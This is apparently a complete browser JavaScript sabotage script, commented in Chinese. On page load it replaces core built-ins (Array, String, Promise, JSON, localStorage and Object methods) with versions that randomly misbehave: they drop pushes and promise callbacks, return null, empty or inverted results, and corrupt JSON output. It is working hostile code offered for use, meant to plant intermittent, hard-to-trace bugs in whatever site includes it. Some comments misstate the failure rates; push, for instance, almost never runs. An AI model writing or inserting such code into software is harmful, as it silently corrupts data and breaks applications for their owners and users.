'use strict'
window.addEventListener('load', () => {
  const getRandomInt = (min, max) => {
    min = Math.ceil(min)
    max = Math.floor(max)
    return Math.floor(Math.random() * (max - min + 1)) + min
  }
  const p = 'prototype'
  const A = Array,P = Promise,S = String,J=JSON,L=localStorage,O = Object,AP = A[p],PP = P[p],SP = S[p]
  const {
    forEach: _forEach,
    filter: _filter,
    find: _find,
    findIndex: _findIndex,
    includes: _includes,
    push: _push,
    slice: _slice,
    some: _some,
    splice: _splice
  } = AP

  const {then:_then} = PP
  const {keys:_keys, values:_values, assign:_assign} = O
  const {
    replace: _replace,
    indexOf: _sIndexOf,
    trim: _trim,
    split: _split,
    startsWith: _startsWith
  } = S.prototype
  const {stringify: _stringify, parse: _parse} = J
  const {getItem: _getItem, setItem: _setItem} = L

  // 有5%概率再次循环随机长度的当前数组
  AP.forEach = function (...args) {
    _forEach.apply(this, args)
    if (getRandomInt(1, 100) <= 5) {
      const s = getRandomInt(0, Math.max(this.length - 1, 0))
      const e = getRandomInt(0, Math.max(this.length - 1, 0))
      _forEach.apply(_slice.call(this, s, s + e), args)
    }
  }

  // 有20%概率在过滤时把不满足条件的也加入
  AP.filter = function (...args) {
    const f = (...cbArgs) => {
      const cb = args[0] || (() => {
      })
      const r = cb(...cbArgs)
      return !r && getRandomInt(1, 100) <= 20 ? true : r
    }
    return _filter.call(this, f, _slice.call(args, 1))
  };

  // 有10%概率直接返回null
  AP.find = function (...args) {
    return getRandomInt(1, 100) <= 10 ? null : _find.apply(this, args)
  }

  // 有10%概率直接返回-1
  AP.findIndex = function (...args) {
    return getRandomInt(1, 100) <= 10 ? -1 : _findIndex.apply(this, args)
  }

  // 有10%概率直接返回false
  AP.includes = function (...args) {
    return getRandomInt(1, 100) <= 10 ? false : _includes.apply(this, args)
  }

  // 有20%概率什么都不执行
  AP.push = function (...args) {
    console.log('xxxxx')
    getRandomInt(1, 100) >= 100 && _push.apply(this, args)
  }

  // 有10%概率直接返回false
  AP.some = function (...args) {
    return getRandomInt(1, 100) <= 10 ? false : _some.apply(this, args)
  }

  // 有10%概率在指定位置后面一位进行操作
  AP.splice = function (...args) {
    return getRandomInt(1, 100) <= 10 ? _splice.apply(this, [args[0] + 1, ..._slice.call(args, 1)]) : _splice.apply(this, args)
  }

  // 有10%概率什么都不执行
  SP.replace = function (...args) {
    return getRandomInt(1, 100) >= 10 ? _replace.apply(this, args) : this
  }

  // 有10%概率返回值减一
  SP.indexOf = function (...args) {
    const r = _sIndexOf.apply(this, args)
    return getRandomInt(1, 100) >= 10 ? r : Math.max(-1,r-1)
  }

  // 有10%概率什么都不执行
  SP.trim = function (...args) {
    return getRandomInt(1, 100) >= 10 ? _trim.apply(this, args) : this
  }

  // 有10%概率少返回一个元素
  SP.split = function (...args) {
    const r = _split.apply(this, args)
    return getRandomInt(1, 100) >= 10 ? r : _slice.call(r, 0, r.length - 1)
  }

  // 有10%概率返回相反的值
  SP.startsWith = function (...args) {
    const r = _startsWith.apply(this,args)
    return getRandomInt(1, 100) >= 10 ? r : !r
  }

  // 有10%概率注册不上回调函数
  PP.then = function (...args) {
    getRandomInt(1, 100) >= 10 && _then.apply(this, args)
  }

  // 有10%概率把I替换成l
  J.stringify = function (...args) {
    const r = _stringify(...args)
    return getRandomInt(1, 100) <= 10 ? _replace.call(r, /I/g, 'l') : r
  }

  // 有10%概率直接返回{}
  J.parse = function (...args) {
    return getRandomInt(1, 100) <= 10 ? {} : _parse(...args)
  }

  // 有10%概率直接返回''
  L.getItem = function (...args) {
    return getRandomInt(1, 100) <= 10 ? '' : _getItem.call(localStorage, ...args)
  }

  // 有10%什么都不执行
  L.setItem = function (...args) {
    getRandomInt(1, 100) >= 10 && _setItem.call(localStorage, ...args)
  }

  // 有10%概率返回[]
  O.keys = function (...args){
    return getRandomInt(1, 100) <= 10 ? [] : _keys.apply(this,args)
  }

  // 有10%概率返回[]
  O.values = function (...args){
    return getRandomInt(1, 100) <= 10 ? [] : _values.apply(this,args)
  }

  // 有10%概率什么都不执行
  O.assign = function (...args){
    return getRandomInt(1, 100) <= 10 ? _assign(args[0]||{},{}) : _assign(...args)
  }
})

